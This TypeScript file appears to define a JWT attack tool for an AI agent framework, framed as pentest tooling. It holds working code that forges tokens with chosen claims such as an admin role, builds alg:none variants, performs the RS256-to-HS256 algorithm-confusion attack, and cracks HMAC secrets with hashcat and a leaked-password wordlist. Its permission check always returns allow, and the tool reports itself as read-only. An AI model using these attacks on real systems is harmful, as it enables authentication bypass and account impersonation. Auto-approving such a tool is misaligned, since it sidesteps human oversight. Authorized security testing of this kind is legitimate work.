import { execFile } from 'child_process'
import { promisify } from 'util'
import { createHmac } from 'crypto'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { JWT_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['decode', 'forge', 'crack', 'alg_none', 'alg_confusion', 'check_exp'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    token: z.string().describe('JWT string (eyJ... format)'),
    action: z.enum(ACTIONS).describe('JWT test action'),
    claims: z
      .string()
      .optional()
      .describe('JSON string of custom claims for forge action (e.g. \'{"role":"admin"}\')'),
    secret: z
      .string()
      .optional()
      .describe('HMAC secret for forge action, or known secret to verify'),
    public_key: z
      .string()
      .optional()
      .describe('RSA public key PEM for alg_confusion attack'),
    wordlist: z
      .string()
      .optional()
      .default('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz')
      .describe('Wordlist path for crack action'),
    timeout_secs: z
      .number()
      .int()
      .min(5)
      .max(3600)
      .default(60)
      .describe('Timeout in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    action: z.string(),
    token_preview: z.string(),
    header: z.record(z.string(), z.unknown()).optional(),
    payload: z.record(z.string(), z.unknown()).optional(),
    algorithm: z.string().optional(),
    forged_token: z.string().optional(),
    cracked_secret: z.string().optional(),
    cracked: z.boolean().optional(),
    is_expired: z.boolean().optional(),
    expiry_info: z.string().optional(),
    finding: z.string().optional(),
    severity: z.enum(['critical', 'high', 'medium', 'low', 'info']).optional(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

// ── Helpers ──────────────────────────────────────────────────────────────────

function b64urlDecode(str: string): string {
  const padded = str + '='.repeat((4 - (str.length % 4)) % 4)
  return Buffer.from(padded.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8')
}

function b64urlEncode(data: Buffer | string): string {
  const buf = typeof data === 'string' ? Buffer.from(data) : data
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
}

function parseJWT(token: string): {
  header: Record<string, unknown>
  payload: Record<string, unknown>
  signature: string
  parts: string[]
} | null {
  const parts = token.trim().split('.')
  if (parts.length !== 3) return null
  try {
    const header = JSON.parse(b64urlDecode(parts[0]!))
    const payload = JSON.parse(b64urlDecode(parts[1]!))
    return { header, payload, signature: parts[2]!, parts }
  } catch {
    return null
  }
}

function hmacSign(data: string, secret: string, alg: string): string {
  const hashAlg = alg.toLowerCase() === 'hs512' ? 'sha512'
    : alg.toLowerCase() === 'hs384' ? 'sha384'
    : 'sha256'
  const sig = createHmac(hashAlg, secret).update(data).digest()
  return b64urlEncode(sig)
}

function buildForgedToken(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  secret: string,
): string {
  const h = b64urlEncode(Buffer.from(JSON.stringify(header)))
  const p = b64urlEncode(Buffer.from(JSON.stringify(payload)))
  const alg = String(header.alg ?? 'HS256')
  const sig = hmacSign(`${h}.${p}`, secret, alg)
  return `${h}.${p}.${sig}`
}

// ── Actions ──────────────────────────────────────────────────────────────────

function actionDecode(token: string): Output {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'decode', token_preview: token.substring(0, 30), error: 'Invalid JWT format' }

  return {
    action: 'decode',
    token_preview: token.substring(0, 40) + '...',
    header: parsed.header,
    payload: parsed.payload,
    algorithm: String(parsed.header.alg ?? 'unknown'),
    finding: `Algorithm: ${parsed.header.alg}, Kid: ${parsed.header.kid ?? 'none'}, Typ: ${parsed.header.typ ?? 'JWT'}`,
    severity: 'info',
  }
}

function actionCheckExp(token: string): Output {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'check_exp', token_preview: token.substring(0, 30), error: 'Invalid JWT' }

  const nowSecs = Math.floor(Date.now() / 1000)
  const exp = parsed.payload.exp
  const iat = parsed.payload.iat

  let expInfo = ''
  let isExpired = false
  let severity: Output['severity'] = 'info'

  if (exp === undefined || exp === null) {
    expInfo = 'No expiry (exp claim missing) — token lives forever'
    severity = 'high'
  } else {
    const expNum = Number(exp)
    if (!isNaN(expNum)) {
      const remaining = expNum - nowSecs
      if (remaining < 0) {
        isExpired = true
        expInfo = `Expired ${Math.abs(remaining)}s ago (${new Date(expNum * 1000).toISOString()})`
      } else {
        expInfo = `Valid for ${remaining}s until ${new Date(expNum * 1000).toISOString()}`
        if (remaining > 86400 * 365) severity = 'medium' // > 1 year
      }
    }
  }

  const iatInfo = iat ? `Issued at: ${new Date(Number(iat) * 1000).toISOString()}` : 'No iat claim'

  return {
    action: 'check_exp',
    token_preview: token.substring(0, 40) + '...',
    header: parsed.header,
    payload: parsed.payload,
    is_expired: isExpired,
    expiry_info: `${expInfo} | ${iatInfo}`,
    finding: expInfo,
    severity,
  }
}

function actionAlgNone(token: string): Output {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'alg_none', token_preview: token.substring(0, 30), error: 'Invalid JWT' }

  // Produce tokens for each alg:none capitalisation variant — some servers only check
  // for the exact string "none", "None", "NONE", or "nOnE" case-insensitively (or not).
  const ALG_NONE_VARIANTS = ['none', 'None', 'NONE', 'nOnE']
  const variants: string[] = []
  for (const algVariant of ALG_NONE_VARIANTS) {
    const forgedHeader = { ...parsed.header, alg: algVariant }
    const h = b64urlEncode(Buffer.from(JSON.stringify(forgedHeader)))
    const p = b64urlEncode(Buffer.from(JSON.stringify(parsed.payload)))
    // Both trailing-dot (empty sig) and completely absent signature variants
    variants.push(`${h}.${p}.`)   // trailing dot — most common
    variants.push(`${h}.${p}`)    // no dot — some implementations
  }

  // Return the canonical lowercase-none as the primary forged_token; include all variants
  const primaryForged = variants[0]!
  return {
    action: 'alg_none',
    token_preview: token.substring(0, 40) + '...',
    header: { ...parsed.header, alg: 'none' },
    payload: parsed.payload,
    algorithm: 'none',
    forged_token: primaryForged,
    finding: `Algorithm-none attack: generated ${variants.length} variants. Test each — servers differ on case sensitivity and trailing-dot handling:\n${variants.map((v, i) => `  [${i + 1}] ${v.substring(0, 80)}...`).join('\n')}`,
    severity: 'critical',
  }
}

function actionForge(token: string, claims?: string, secret = 'secret'): Output {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'forge', token_preview: token.substring(0, 30), error: 'Invalid JWT' }

  let customClaims: Record<string, unknown> = {}
  if (claims) {
    try {
      customClaims = JSON.parse(claims)
    } catch {
      return { action: 'forge', token_preview: token.substring(0, 30), error: 'Invalid JSON in claims parameter' }
    }
  }

  const forgedPayload = { ...parsed.payload, ...customClaims }
  const forgedHeader = { ...parsed.header, alg: 'HS256' }
  const forgedToken = buildForgedToken(forgedHeader, forgedPayload, secret)

  return {
    action: 'forge',
    token_preview: token.substring(0, 40) + '...',
    header: forgedHeader,
    payload: forgedPayload,
    algorithm: 'HS256',
    forged_token: forgedToken,
    finding: `Forged with secret="${secret}" and claims: ${JSON.stringify(customClaims)}`,
    severity: 'critical',
  }
}

function actionAlgConfusion(token: string, publicKey?: string): Output {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'alg_confusion', token_preview: token.substring(0, 30), error: 'Invalid JWT' }

  if (!publicKey) {
    return {
      action: 'alg_confusion',
      token_preview: token.substring(0, 30),
      finding: 'RSA→HMAC confusion attack requires public_key parameter. Obtain the server public key from JWKS endpoint (/.well-known/jwks.json) or certificate.',
      severity: 'info',
    }
  }

  // Sign original payload with public key as HMAC secret (RS256→HS256 confusion)
  const forgedHeader = { ...parsed.header, alg: 'HS256' }
  const h = b64urlEncode(Buffer.from(JSON.stringify(forgedHeader)))
  const p = b64urlEncode(Buffer.from(JSON.stringify(parsed.payload)))
  const sig = createHmac('sha256', publicKey).update(`${h}.${p}`).digest()
  const forgedToken = `${h}.${p}.${b64urlEncode(sig)}`

  return {
    action: 'alg_confusion',
    token_preview: token.substring(0, 40) + '...',
    header: forgedHeader,
    payload: parsed.payload,
    algorithm: 'HS256 (confusion)',
    forged_token: forgedToken,
    finding: 'RS256→HS256 algorithm confusion: server verifies HS256 sig using RSA public key as HMAC secret',
    severity: 'critical',
  }
}

async function actionCrack(
  token: string,
  wordlist: string,
  timeoutSecs: number,
  signal?: AbortSignal,
): Promise<Output> {
  const parsed = parseJWT(token)
  if (!parsed) return { action: 'crack', token_preview: token.substring(0, 30), error: 'Invalid JWT' }

  const alg = String(parsed.header.alg ?? 'HS256')
  if (!alg.startsWith('HS')) {
    return {
      action: 'crack',
      token_preview: token.substring(0, 40) + '...',
      algorithm: alg,
      cracked: false,
      finding: `Algorithm ${alg} is not HMAC-based — cannot crack. Only HS256/HS384/HS512 are crackable.`,
      severity: 'info',
    }
  }

  const hashcatMode = alg === 'HS512' ? '16500' : alg === 'HS384' ? '16500' : '16500' // JWT is always 16500 in hashcat

  try {
    const { stdout, stderr } = await execFileAsync(
      'hashcat',
      ['-m', '16500', '--quiet', '--status', token, wordlist],
      { timeout: timeoutSecs * 1000 + 5000, maxBuffer: 512 * 1024, signal },
    )
    const output = stdout + stderr

    // Look for cracked result in hashcat output format: token:secret
    const crackedMatch = output.match(new RegExp(`${token.substring(0, 20).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[^:]*:(.+)`))
    if (crackedMatch?.[1]) {
      const secret = crackedMatch[1].trim()
      const forgedToken = buildForgedToken({ ...parsed.header }, parsed.payload, secret)
      return {
        action: 'crack',
        token_preview: token.substring(0, 40) + '...',
        algorithm: alg,
        cracked: true,
        cracked_secret: secret,
        forged_token: forgedToken,
        finding: `Secret cracked: "${secret}" — JWT is completely compromised`,
        severity: 'critical',
      }
    }

    return {
      action: 'crack',
      token_preview: token.substring(0, 40) + '...',
      algorithm: alg,
      cracked: false,
      finding: 'Secret not found in wordlist',
      severity: 'info',
    }
  } catch (err: unknown) {
    return {
      action: 'crack',
      token_preview: token.substring(0, 40) + '...',
      algorithm: alg,
      cracked: false,
      finding: 'Crack failed — hashcat not available or error',
      error: errorMessage(err),
      severity: 'info',
    }
  }
}

// ── Test exports ──────────────────────────────────────────────────────────────

export const __test = {
  parseJWT,
  b64urlDecode,
  b64urlEncode,
  actionDecode,
  actionCheckExp,
  actionAlgNone,
  actionForge,
  actionAlgConfusion,
}

// ── Tool ──────────────────────────────────────────────────────────────────────

export const JWTTool = buildTool({
  name: JWT_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  maxResultSizeChars: 40_000,
  searchHint: 'jwt — decode forge crack algorithm confusion json web token',
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const preview = i.token ? i.token.substring(0, 20) + '...' : ''
    return `${i.action ?? 'decode'}: ${preview}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `${JWT_TOOL_NAME}:${i.action}` : JWT_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `jwt ${i?.action ?? 'decode'}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `JWT ${i?.action ?? 'decode'}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const preview = i.token ? i.token.substring(0, 20) + '...' : ''
    return `JWT ${i.action ?? 'decode'}: ${preview}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      let result: Output

      switch (input.action) {
        case 'decode':
          result = actionDecode(input.token)
          break
        case 'check_exp':
          result = actionCheckExp(input.token)
          break
        case 'alg_none':
          result = actionAlgNone(input.token)
          break
        case 'forge':
          result = actionForge(input.token, input.claims, input.secret)
          break
        case 'alg_confusion':
          result = actionAlgConfusion(input.token, input.public_key)
          break
        case 'crack':
          result = await actionCrack(
            input.token,
            input.wordlist ?? '/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz',
            input.timeout_secs ?? 60,
            context.abortController.signal,
          )
          break
        default:
          result = { action: input.action, token_preview: input.token.substring(0, 30), error: 'Unknown action' }
      }

      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`JWTTool error: ${errorMessage(err)}`)
      return {
        data: {
          action: input.action,
          token_preview: input.token.substring(0, 30),
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`JWT ${content.action}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    if (content.severity && content.severity !== 'info') {
      lines.push(`Severity: ${content.severity.toUpperCase()}`)
    }

    if (content.header) {
      lines.push(`Header: ${JSON.stringify(content.header)}`)
    }

    if (content.payload) {
      const p = content.payload
      lines.push(`Payload: ${JSON.stringify(p)}`)

      // Highlight interesting claims
      if (p.sub) lines.push(`  sub (subject): ${p.sub}`)
      if (p.role) lines.push(`  role: ${p.role}`)
      if (p.admin) lines.push(`  admin: ${p.admin}`)
      if (p.exp) lines.push(`  exp: ${new Date(Number(p.exp) * 1000).toISOString()}`)
    }

    if (content.finding) lines.push(`\nFinding: ${content.finding}`)
    if (content.forged_token) lines.push(`\nForged token:\n${content.forged_token}`)
    if (content.cracked_secret) lines.push(`\nCracked secret: ${content.cracked_secret}`)
    if (content.expiry_info) lines.push(`\n${content.expiry_info}`)

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)
